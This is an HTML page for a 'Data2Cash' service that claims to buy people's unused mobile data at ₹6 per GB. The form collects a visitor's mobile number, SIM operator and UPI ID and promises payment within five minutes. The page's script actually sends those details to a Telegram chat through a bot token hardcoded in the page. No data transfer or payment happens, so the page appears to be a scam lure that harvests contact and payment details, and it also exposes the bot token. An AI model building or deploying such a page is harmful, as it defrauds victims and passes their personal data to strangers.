<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sell Unused Data & Earn Cash</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; }
    
    body {
      background: linear-gradient(135deg, #0f172a, #1e293b);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 16px;
      padding: 25px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
    }

    .card-title {
      font-size: 22px;
      font-weight: 700;
      color: #38bdf8;
      text-align: center;
      margin-bottom: 5px;
    }

    .rate-badge {
      text-align: center;
      font-size: 13px;
      color: #4ade80;
      background: rgba(74, 222, 128, 0.1);
      padding: 6px;
      border-radius: 20px;
      margin-bottom: 20px;
      border: 1px solid rgba(74, 222, 128, 0.2);
    }

    .form-group { margin-bottom: 15px; }

    label {
      display: block;
      font-size: 13px;
      color: #94a3b8;
      margin-bottom: 6px;
    }

    input, select {
      width: 100%;
      padding: 12px;
      background: #0f172a;
      border: 1px solid #334155;
      border-radius: 8px;
      color: #fff;
      font-size: 14px;
      outline: none;
    }

    input:focus, select:focus { border-color: #38bdf8; }

    .payout-box {
      background: #0f172a;
      border: 1px dashed #38bdf8;
      border-radius: 8px;
      padding: 12px;
      text-align: center;
      margin: 15px 0;
    }

    .payout-amount { font-size: 24px; font-weight: bold; color: #38bdf8; }

    .btn-submit {
      width: 100%;
      padding: 12px;
      background: #2563eb;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .btn-submit:hover { background: #1d4ed8; }

    .success-msg {
      display: none;
      background: rgba(34, 197, 94, 0.15);
      border: 1px solid #22c55e;
      color: #4ade80;
      padding: 12px;
      border-radius: 8px;
      font-size: 14px;
      text-align: center;
      margin-top: 15px;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="card-title"><i class="fa-solid fa-wifi"></i> Data2Cash</div>
    <div class="rate-badge">रेट: 1 GB (1024 MB) = ₹6.00</div>

    <form id="dataForm" onsubmit="handleSubmit(event)">
      
      <div class="form-group">
        <label>मोबाइल नंबर</label>
        <input type="tel" id="mobile" placeholder="10-अंकों का नंबर" required pattern="[0-9]{10}">
      </div>

      <div class="form-group">
        <label>सिम कंपनी</label>
        <select id="operator" required>
          <option value="" disabled selected>कंपनी चुनें...</option>
          <option value="Jio">Jio</option>
          <option value="Airtel">Airtel</option>
          <option value="Vi">Vi</option>
          <option value="BSNL">BSNL</option>
        </select>
      </div>

      <div class="form-group">
        <label>डेटा (MB में)</label>
        <input type="number" id="mbData" placeholder="उदा. 1024" required min="1" oninput="calculateAmount()">
      </div>

      <div class="form-group">
        <label>UPI ID (पेमेंट पाने के लिए)</label>
        <input type="text" id="upiId" placeholder="उदा. name@upi" required>
      </div>

      <div class="payout-box">
        <label style="margin:0;">अनुमानित कमाई</label>
        <div class="payout-amount" id="payout">₹ 0.00</div>
      </div>

      <button type="submit" class="btn-submit" id="submitBtn">सबमिट करें और डेटा बेचें</button>

    </form>

    <div class="success-msg" id="successMsg">
      <i class="fa-solid fa-circle-check"></i> रिक्वेस्ट सबमिट हो गई है! भुगतान 5 मिनट में कर दिया जाएगा।
    </div>
  </div>

<script>
  // Bot Token & Chat ID Set Correctly
  const TELEGRAM_BOT_TOKEN = "8899074021:AAHw5zYbB38Y4op6FW44ElOVMsGPLTGYhy0";
  const TELEGRAM_CHAT_ID = "7742143795";

  function calculateAmount() {
    const mbInput = document.getElementById('mbData').value;
    const payoutDiv = document.getElementById('payout');

    if (mbInput && mbInput > 0) {
      const ratePerMB = 6 / 1024;
      const totalPayout = (mbInput * ratePerMB).toFixed(2);
      payoutDiv.innerText = '₹ ' + totalPayout;
    } else {
      payoutDiv.innerText = '₹ 0.00';
    }
  }

  async function handleSubmit(e) {
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    btn.innerText = "प्रोसेस हो रहा है...";
    btn.disabled = true;

    const mobile = document.getElementById('mobile').value;
    const operator = document.getElementById('operator').value;
    const mbData = document.getElementById('mbData').value;
    const upiId = document.getElementById('upiId').value;
    const amount = (mbData * (6 / 1024)).toFixed(2);

    const msgText = `🚀 *New Data Sell Request!*\n\n📱 *Mobile:* ${mobile}\n🏢 *Operator:* ${operator}\n📊 *Data:* ${mbData} MB\n💰 *Amount:* ₹${amount}\n💳 *UPI ID:* \`${upiId}\``;
    
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msgText,
          parse_mode: 'Markdown'
        })
      });

      document.getElementById('successMsg').style.display = 'block';
      document.getElementById('dataForm').reset();
      document.getElementById('payout').innerText = '₹ 0.00';
    } catch (err) {
      alert("कुछ गड़बड़ हुई! कृपया दोबारा प्रयास करें।");
      console.error(err);
    } finally {
      btn.innerText = "सबमिट करें और डेटा बेचें";
      btn.disabled = false;
    }
  }
</script>

</body>
</html>
